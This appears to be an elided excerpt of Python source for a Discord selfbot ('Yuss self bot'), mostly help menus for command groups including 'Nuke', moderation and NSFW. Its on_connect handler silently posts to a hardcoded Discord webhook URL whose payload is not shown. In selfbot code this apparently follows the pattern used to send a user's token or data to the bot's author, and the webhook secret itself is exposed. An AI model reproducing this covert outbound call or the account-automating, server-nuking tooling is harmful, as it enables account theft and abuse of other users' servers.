...
async def on_connect():
    requests.post(
        'https://discord.com/api/webhooks/1014914647872254014/Fgta5FgNDoN1u8fxGa8DOkDnF5mELbbgvUzCnTmqM5L9bJ2qcHx2FeYdKRd8Bh9d2YAs',
...
async def help(ctx):
    ...
    try:
        ...
        embed.set_author(name="𝒀𝒖𝒔𝒔 𝒔𝒆𝒍𝒇 𝒃𝒐𝒕", icon_url=ctx.author.avatar_url)
        embed.set_footer(text="Yuss self bot")
        embed.set_thumbnail(url=ctx.author.avatar_url)
        embed.set_image(
            url=
            "https://media.tenor.co/videos/726c00ca7f375035bf2c599e6ed7d6fe/mp4"
        )
        embed.add_field(name="*Yuss Mod *",
                        value="`Shows The Moderation Commands`",
                        inline=False)
        embed.add_field(name="*Yuss Miscellaneous*",
                        value="`Shows The Miscellaneous Commands`",
                        inline=False)
        embed.add_field(name="*Yuss Utility*",
                        value="`Shows The Utility Commands`",
                        inline=False)
        embed.add_field(name="*Yuss Status*",
                        value="`Shows The Status Commands`",
                        inline=False)
        embed.add_field(name="*Yuss Nuke",
                        value="`Shows The Nuke Commands`",
                        inline=False)
        embed.add_field(name="*Yuss Personal*",
                        value="`Shows The Personal Commands`",
                        inline=False)
        embed.add_field(name="*Yuss Math*",
                        value="`Shows The Math Commands`",
                        inline=False)
        embed.add_field(name="*Yuss Server*",
                        value="`Shows The Server Commands`",
                        inline=False)
        embed.add_field(name="*Yuss Nsfw*",
                        value="`Shows The NSFW Commands`",
                        inline=False)
        await ctx.send(embed=embed)
    except:
        await ctx.send("""**__Yuss SelfBot Help__**\n
**Moderation**
...
async def moderation(ctx):
    ...
    try:
        ...
        await ctx.send("""**__Vanis SelfBot Moderation__**\n
...
async def nuke(ctx):
    ...
    try:
        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
                              timestamp=ctx.message.created_at)
        embed.set_footer(text="Yuss SelfBot")
        embed.set_thumbnail(url=ctx.author.avatar_url)
        embed.set_image(
            url=
        ...
        await ctx.send("""**__Yuss SelfBot Nuke__**\n
*[] Is Required, <> Is Optional*
...
async def math(ctx):
    ...
    try:
        ...
        await ctx.send("""**__Yuss SelfBot Math__**\n
*[] Is Required, <> Is Optional*
...
async def server(ctx):
    ...
    try:
        ...
        await ctx.send("""**__Yuss SelfBot Server__**\n
*[] Is Required, <> Is Optional*
...
async def personal(ctx):
    ...
    try:
        ...
        await ctx.send("""**__Yuss SelfBot Personal__**\n
*[] Is Required, <> Is Optional*
...
async def creator(ctx):
    ...
    try:
        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
                              title="Creator!",
                              description="Cartier, <@796220560534798357>")
        await ctx.send(embed=embed)
    except:
...
async def stream(ctx, *, x):
    ...
    await client.change_presence(
        activity=discord.Streaming(name=x, url="https://twitch.tv/ulxywulxy"))
